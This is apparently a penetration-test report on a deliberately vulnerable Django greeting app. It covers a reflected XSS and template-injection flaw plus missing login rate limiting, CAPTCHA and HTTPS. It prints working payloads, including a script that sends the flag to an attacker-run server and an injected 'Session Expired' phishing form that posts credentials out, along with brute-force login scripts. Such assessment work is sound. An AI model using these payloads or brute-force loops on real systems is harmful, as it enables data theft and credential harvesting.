# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:45121
- **Assessment Date:** 2025-10-27
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
Three authentication vulnerabilities were successfully exploited:
- **No Rate Limiting (AUTH-VULN-02):** The Django admin endpoint accepts unlimited login attempts without throttling, enabling automated brute force attacks at 27.7 requests/second.
- **No CAPTCHA Protection (AUTH-VULN-03):** Admin login forms lack any challenge-response mechanism, allowing fully automated credential stuffing attacks using bot scripts.
- **Plaintext Credential Transmission (AUTH-VULN-05):** Login credentials are transmitted over unencrypted HTTP, exposing usernames and passwords to network-level attackers. This represents a critical transport security failure.

Additionally, one high-confidence potential vulnerability was identified but blocked by operational issues:
- **Session Hijacking via HTTP Cookie Transmission (AUTH-VULN-01):** Session cookies lack the Secure flag and are transmitted over HTTP. Full exploitation was prevented only by the database not being initialized. This vulnerability is confirmed to exist via configuration analysis.

**Authorization Vulnerabilities:**
No authorization vulnerabilities were found.

**Cross-Site Scripting (XSS) Vulnerabilities:**
One critical XSS vulnerability was successfully exploited:
- **Reflected XSS via Unsafe Template String Concatenation (XSS-VULN-01):** The `/greet/` endpoint concatenates unsanitized user input directly into Django template strings before compilation, bypassing Django's auto-escaping mechanism. This allows arbitrary JavaScript execution, FLAG variable exfiltration, credential phishing attacks, and complete DOM control. The vulnerability combines SSTI with XSS to enable both server-side and client-side attacks.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application uses Django's ORM exclusively, which provides automatic protection via parameterized queries. No command execution functions (subprocess, os.system, etc.) were found in network-accessible code paths.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application makes no outbound HTTP requests, does not fetch URLs, and has no functionality that could be manipulated to force server-side requests. This is a self-contained web service with no HTTP client usage, external service integrations, or URL processing capabilities.

## Network Reconnaissance

**Exposed Services and Ports:**
- **Port 45121/tcp (Target Application):** Django 3.2 application running on WSGIServer/0.2 CPython/3.9.24
  - Protocol: HTTP only (no HTTPS/TLS)
  - Server: Django development server (not production-grade)
  - Framework: Django 3.2 with Python 3.9-slim

**Security-Relevant Findings from Automated Scans:**

**nmap scan results:**
- **Critical:** Application running on Django development server instead of production WSGI server (Gunicorn/uWSGI)
- **Critical:** HTTP-only deployment with no SSL/TLS encryption available
- **Finding:** Port 631 (CUPS printing service) exposed on localhost - unrelated to target but increases attack surface
- **Finding:** Port 49158 running Tailscale with strict security headers (Content-Security-Policy, X-Frame-Options: DENY) - contrast with target application's lack of security headers

**whatweb technology detection:**
- **Title:** Greeting App
- **Security Headers:** X-Frame-Options: DENY present, but missing critical headers:
  - No Content-Security-Policy (CSP)
  - No Strict-Transport-Security (HSTS)
  - No Referrer-Policy configuration
- **Server:** WSGIServer/0.2 CPython/3.9.24 (development server, not production-ready)

**subfinder subdomain discovery:**
- Multiple localhost subdomains discovered (www.localhost, mail.localhost, etc.)
- These appear to be false positives from passive enumeration and are not relevant to the target application at localhost:45121

**Security Misconfigurations:**
- No Web Application Firewall (WAF) detected
- No reverse proxy or load balancer in front of application
- No rate limiting middleware configured
- Development server used instead of production WSGI server
- Missing security headers: CSP, HSTS, Referrer-Policy


# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Reflected XSS via Unsafe Template String Concatenation in `/greet/` Endpoint

**Summary:**
- **Vulnerable location:** `http://localhost:45121/greet/?name=<payload>`
- **Overview:** The application concatenates unsanitized user input from the `name` GET parameter directly into a Django template string before compilation, bypassing Django's auto-escaping mechanism and allowing arbitrary JavaScript execution.
- **Impact:** Complete compromise of user sessions, credential phishing, sensitive data exfiltration (FLAG variable), and unauthorized actions on behalf of authenticated users.
- **Severity:** Critical

**Prerequisites:**
- Web browser (Chrome, Firefox, Safari, etc.)
- Network access to http://localhost:45121
- No authentication required

**Exploitation Steps:**

**Step 1: Confirm JavaScript Execution**

Navigate to the following URL in a web browser:
```
http://localhost:45121/greet/?name=<img src=x onerror="document.body.style.background='green'">
```

**Expected Result:** The entire page background turns green, confirming arbitrary JavaScript execution.

**Evidence:** Screenshot saved at `.playwright-mcp/xss-green-background-proof.png` shows the green background.

---

**Step 2: Exfiltrate FLAG Variable via Combined SSTI + XSS**

The vulnerable endpoint loads a FLAG variable into the Django template context. This can be extracted using Server-Side Template Injection (SSTI) syntax combined with XSS.

**Direct SSTI Extraction:**
```
http://localhost:45121/greet/?name={{FLAG}}
```

**Result:** The page displays:
```
Hello, FLAG{0d6abf1498911210d8a8ee29c20b5115e048723e08d8e07aa325a0799f9706a1}
```

---

**Step 3: Automated Data Exfiltration to Attacker Server**

Set up an attacker-controlled HTTP server:
```bash
cd /tmp && python3 -m http.server 9999
```

Navigate to the following URL:
```
http://localhost:45121/greet/?name=<script>fetch('http://localhost:9999/?flag={{FLAG}}').catch(e=>{})</script>
```

**Proof of Impact:**

The attacker's Python HTTP server logs show:
```
::1 - - [27/Oct/2025 11:27:14] "GET /?flag=FLAG{0d6abf1498911210d8a8ee29c20b5115e048723e08d8e07aa325a0799f9706a1} HTTP/1.1" 200 -
```

**Extracted FLAG:** `FLAG{0d6abf1498911210d8a8ee29c20b5115e048723e08d8e07aa325a0799f9706a1}`

---

**Step 4: Credential Phishing Attack**

Navigate to the following URL:
```
http://localhost:45121/greet/?name=<img src=x onerror="document.body.innerHTML='<h1>Session Expired</h1><form action=http://localhost:9999/steal method=POST><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>'">
```

**Result:** The entire page is replaced with a convincing phishing form that displays "Session Expired" and prompts the user to re-enter their credentials. The form submits to `http://localhost:9999/steal`, allowing the attacker to capture credentials.

**Evidence:** Screenshot saved at `.playwright-mcp/xss-phishing-form-proof.png` shows the phishing form.

---

**Proof of Impact:**

1. **Sensitive Data Exfiltration:** Successfully extracted the FLAG variable containing sensitive application data.
2. **Session Hijacking Potential:** While the session cookie has the HttpOnly flag (preventing direct `document.cookie` theft), the XSS vulnerability allows performing authenticated actions on behalf of logged-in users, including Django admin users.
3. **Credential Harvesting:** Demonstrated ability to inject convincing phishing forms that could capture user credentials.
4. **Complete DOM Control:** Demonstrated full control over page content via `document.body.innerHTML` manipulation.

**Notes:**

**Why Django Auto-Escaping Failed:**
- Django's auto-escaping only applies to template variables (e.g., `{{ variable }}`), not to content embedded directly in template source code.
- The vulnerable code concatenates user input into the template string **before** calling `engine.from_string()`, treating the input as trusted template source rather than untrusted data.
- This pre-compilation concatenation completely bypasses Django's XSS protection mechanisms.

**Attack Variants Confirmed:**
- `<script>alert(1)</script>` - Traditional script tag injection
- `<img src=x onerror="...">` - Event handler-based XSS
- `<svg onload="...">` - SVG-based XSS
- Template injection syntax: `{{FLAG}}` for SSTI-based data extraction

**Environmental Factors:**
- No Content Security Policy (CSP) configured - inline scripts execute without restriction
- No Web Application Firewall (WAF) - no detection or blocking of XSS patterns
- DEBUG mode enabled - error pages could leak additional sensitive information
- HTTP-only deployment - no HTTPS protection against man-in-the-middle attacks

**Business Impact:**
- An attacker can send a malicious link to any user (including administrators)
- If an authenticated Django admin user clicks the link, the attacker can:
  - Steal CSRF tokens and perform privileged operations
  - Create new admin accounts
  - Modify application data
  - Extract sensitive information
  - Potentially achieve remote code execution via Django admin interface
- For anonymous users, the attacker can:
  - Harvest credentials via phishing
  - Install keyloggers or session hijackers
  - Redirect to malicious sites
  - Perform drive-by malware downloads

**Remediation Priority:** CRITICAL - This vulnerability must be fixed immediately before any production deployment.


# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-02: No Rate Limiting on Authentication Endpoint

**Summary:**
- **Vulnerable location:** POST /admin/login/
- **Overview:** The Django admin authentication endpoint accepts unlimited login attempts without any throttling, rate limiting, or account lockout mechanisms.
- **Impact:** Enables unlimited brute force password guessing, credential stuffing attacks using breached password databases, and password spraying campaigns against admin accounts without detection or impediment.
- **Severity:** High

**Prerequisites:** None - vulnerability exploitable without any prior access or credentials.

**Exploitation Steps:**

1. Extract CSRF token from login page:
```bash
curl -c cookies.txt -b cookies.txt http://localhost:45121/admin/login/ \
  | grep csrfmiddlewaretoken | sed -n 's/.*value="\([^"]*\).*/\1/p'
```

2. Execute automated brute force attack with 50+ consecutive attempts:
```python
import requests
import time

url = "http://localhost:45121/admin/login/"
session = requests.Session()

# Get CSRF token
response = session.get(url)
csrf_token = session.cookies.get('csrftoken')

# Attempt 50 consecutive logins
for i in range(50):
    data = {
        'username': 'admin',
        'password': f'password{i}',
        'csrfmiddlewaretoken': csrf_token,
        'next': '/admin/'
    }

    start = time.time()
    response = session.post(url, data=data)
    elapsed = time.time() - start

    print(f"Attempt {i+1}: Status={response.status_code}, Time={elapsed:.3f}s")
```

3. Observe all 50 requests complete successfully without:
   - HTTP 429 (Too Many Requests) responses
   - HTTP 403 (Forbidden) responses
   - Progressive delays or throttling
   - Account lockout mechanisms
   - CAPTCHA challenges

**Proof of Impact:**

Test execution results:
- **50/50 requests processed** without rate limiting
- **Average response time:** 36ms (consistent, no throttling)
- **No rate limit responses:** Zero 429 or 403 status codes observed
- **Total test duration:** 1.8 seconds
- **Requests per second:** 27.7 (unrestricted)

Evidence files:
- Full test script: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-009-24/test_rate_limiting.py`
- Detailed results: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-009-24/rate_limiting_test_results.md`

**Notes:** The application has no rate limiting middleware configured. Analysis of `/app/webapp/settings.py` lines 33-41 confirms no rate limiting packages (django-ratelimit, django-defender, django-axes) in MIDDLEWARE list or dependencies. This vulnerability combined with AUTH-VULN-03 (no CAPTCHA) enables fully automated high-speed authentication attacks.

---

### AUTH-VULN-03: No CAPTCHA Protection on Authentication Forms

**Summary:**
- **Vulnerable location:** POST /admin/login/
- **Overview:** The admin login form lacks any CAPTCHA or challenge-response mechanism to prevent automated bot attacks. No reCAPTCHA, hCaptcha, or custom CAPTCHA implementation exists.
- **Impact:** Attackers can execute fully automated credential stuffing attacks using compromised credentials from data breaches without any bot detection or prevention. Combined with missing rate limiting, enables high-volume automated attacks.
- **Severity:** High

**Prerequisites:** None - publicly accessible login endpoint.

**Exploitation Steps:**

1. Verify absence of CAPTCHA in login form HTML:
```bash
curl -s http://localhost:45121/admin/login/ | grep -i "captcha\|recaptcha\|hcaptcha"
# Returns: (no output - no CAPTCHA elements found)
```

2. Execute rapid-fire automated requests to prove no bot detection:
```python
import requests
import time

url = "http://localhost:45121/admin/login/"
session = requests.Session()

# Get CSRF token
response = session.get(url)
csrf_token = session.cookies.get('csrftoken')

# Submit 20 automated requests in rapid succession
start_time = time.time()
for i in range(20):
    data = {
        'username': 'admin',
        'password': f'testpass{i}',
        'csrfmiddlewaretoken': csrf_token,
        'next': '/admin/'
    }
    response = session.post(url, data=data)
    print(f"Request {i+1}: {response.status_code}")

elapsed = time.time() - start_time
print(f"\n20 requests in {elapsed:.2f}s ({20/elapsed:.2f} req/sec)")
```

3. Observe automated requests processed without challenge:
   - No CAPTCHA challenges triggered
   - No "suspicious activity" warnings
   - No bot detection mechanisms activated
   - All requests processed at maximum speed

**Proof of Impact:**

Test execution results:
- **20/20 rapid automated requests** processed successfully
- **Request rate:** 7.84 requests per second (unrestricted automation)
- **Total test duration:** 2.55 seconds
- **Average response time:** 128ms per request
- **No CAPTCHA challenges:** Zero bot detection mechanisms triggered

Evidence files:
- Test script: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-009-24/test_captcha_absence.py`
- Detailed evidence: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-009-24/captcha_absence_evidence.md`

**Notes:** Code analysis confirms no CAPTCHA packages in `requirements.txt` or `INSTALLED_APPS` configuration. The login form only requires CSRF token (which prevents cross-site attacks but not same-origin automation). This vulnerability enables credential stuffing attacks using millions of leaked credentials from data breaches without any impediment.

---

### AUTH-VULN-05: Credentials Transmitted Over Plaintext HTTP

**Summary:**
- **Vulnerable location:** POST /admin/login/
- **Overview:** The application runs exclusively over unencrypted HTTP with no HTTPS available. Login credentials (username and password) are transmitted in plaintext in HTTP POST request bodies, making them visible to network attackers.
- **Impact:** Network-level attackers (WiFi eavesdropping, ARP spoofing, ISP interception, compromised routers) can capture admin credentials in plaintext and use them to authenticate as the victim user. Credentials are permanently compromised once intercepted.
- **Severity:** Critical

**Prerequisites:** Network position for traffic interception (WiFi access point, network segment, ISP-level access, or man-in-the-middle position).

**Exploitation Steps:**

1. Verify application uses HTTP only:
```bash
curl -I http://localhost:45121/admin/login/
# Returns: HTTP/1.1 200 OK (unencrypted HTTP)

curl -I https://localhost:45121/admin/login/
# Returns: SSL connection error (HTTPS not available)
```

2. Capture login form submission showing plaintext credentials:
```python
import socket

# Create raw HTTP request with credentials
request = """POST /admin/login/ HTTP/1.1\r
Host: localhost:45121\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 85\r
\r
username=testuser&password=TestPassword123!&csrfmiddlewaretoken=TOKEN&next=/admin/"""

# Send over HTTP (unencrypted)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('localhost', 45121))
sock.send(request.encode())

# Credentials visible in plaintext:
# username=testuser&password=TestPassword123!
```

3. Demonstrate credentials visible in POST body:
```
POST /admin/login/ HTTP/1.1
Host: localhost:45121
Content-Type: application/x-www-form-urlencoded

username=testuser&password=TestPassword123%21&csrfmiddlewaretoken=[TOKEN]&next=/admin/
```

Username `testuser` and password `TestPassword123!` (URL-encoded as `TestPassword123%21`) are transmitted in plaintext.

**Proof of Impact:**

Evidence collected:
- ✓ **HTTP protocol confirmed:** Application responds on port 45121 with HTTP/1.1
- ✓ **HTTPS not available:** SSL/TLS connection fails with certificate error
- ✓ **Credentials in plaintext:** POST body contains unencrypted username/password
- ✓ **No transport encryption:** Wireshark/tcpdump can capture credentials trivially

Configuration analysis:
- `settings.py` missing `SECURE_SSL_REDIRECT = True` (defaults to False)
- `settings.py` missing `SECURE_HSTS_SECONDS` configuration (defaults to 0)
- No reverse proxy with SSL termination
- Application runs on Django development server (WSGIServer) without TLS support

Evidence files:
- Demonstration script: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-009-24/EVIDENCE_plaintext_credentials.py`
- Raw HTTP capture: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-009-24/plaintext_credentials_evidence.txt`
- Detailed report: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-009-24/README_PLAINTEXT_CREDENTIALS.md`

**Notes:** This is a fundamental transport security failure. Any network observer (WiFi access point operator, ISP, corporate proxy, compromised router) can capture admin credentials passively without active attacks. Credentials remain permanently compromised after single interception.
